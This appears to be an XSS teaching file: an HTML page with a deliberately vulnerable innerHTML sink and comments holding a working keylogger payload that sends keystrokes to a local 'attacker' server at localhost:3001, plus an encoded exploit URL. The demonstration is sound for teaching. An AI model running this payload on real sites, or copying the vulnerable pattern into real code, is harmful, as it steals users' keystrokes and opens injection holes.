<!-- Open with live-server -->
<!-- This illustrates example of Capturing KeyStroke -->
<!-- Malicious code : <img src="does-not-exist" onerror='var timeout; var buffer = ""; document.querySelector("body").addEventListener("keypress", (event) => { if (event.which !== 0) { clearTimeout(timeout);buffer += String.fromCharCode(event.which); timeout = setTimeout(() => { var xhr = new XMLHttpRequest(); var uri = "http://localhost:3001/keys?data="+ encodeURIComponent(buffer); xhr.open("GET", uri); xhr.send(); buffer = ""; }, 400); }});'\n/> -->
<!-- This code snippet is an example of a Cross-Site Scripting (XSS) attack. Here's a breakdown of what it does: -->
<!--     1. Image Tag with an Error Handler: The code starts with an <img> tag where the src attribute is set to a non-existent image URL (does-not-exist). This will trigger the onerror event when the browser fails to load the image. -->
<!--     2. JavaScript on Error: The onerror attribute contains JavaScript code that executes when the image fails to load. In this case, the code creates a keylogger that captures keystrokes. -->
<!--     3. Keylogger Function: The keylogger function listens for keypress events on the body of the webpage. When a key is pressed, it records the key's character code and appends it to a buffer. -->
<!--     4. Buffering Keystrokes: The buffer stores the captured keystrokes. If no key is pressed for 400 milliseconds, the buffer is sent to an attacker-controlled server. -->
<!--     5. Sending Keystrokes to an Attacker's Server: The captured keystrokes are sent to the attacker's server(http://localhost:3001/keys?) using an XMLHttpRequest. The data is appended to the URL as a query parameter. -->
<!--     6. Clearing the Buffer: After sending the keystrokes, the buffer is cleared to start capturing new keystrokes. -->

<!-- Note : Please convert the malicious code to url encoded format by encodeURIComponent('malicious code') -->
<!-- After encoding, the final URL will look like this : -->
 <!-- http://127.0.0.1:5500/Security/XSS/vulnerability/example4.html?name=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%27var%20timeout%3B%20var%20buffer%20%3D%20%22%22%3B%20document.querySelector(%22body%22).addEventListener(%22keypress%22%2C%20(event)%20%3D%3E%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3Bbuffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(()%20%3D%3E%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%22http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%22%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%22GET%22%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%22%22%3B%20%7D%2C%20400)%3B%20%7D%7D)%3B%27%0A%2F%3E -->
<!-- After this just press some keystroke and observe it in network tab -->

<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>XSS Example</title>
 </head>
 <body>
 
 <!-- Vulnerable Code -->
 <div>
     Welcome, <span id="username"></span>!
  </div>
 
 <script>
     // Function to set a cookie, mostly this will be set from server
     function setCookie(name, value, days) {
         const date = new Date();
         date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
         const expires = "expires=" + date.toUTCString();
         document.cookie = name + "=" + value + ";" + expires + ";path=/";
     }
 
     // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
     setCookie("exampleCookie", "Hello, Cookie!", 7);
 </script>
 
 <!-- Vulnerable Code -->
 <script>
     const params = new URLSearchParams(window.location.search);
     const name = params.get('name');
     document.getElementById('username').innerHTML = name;
  </script>
 
 </body>
 </html>
 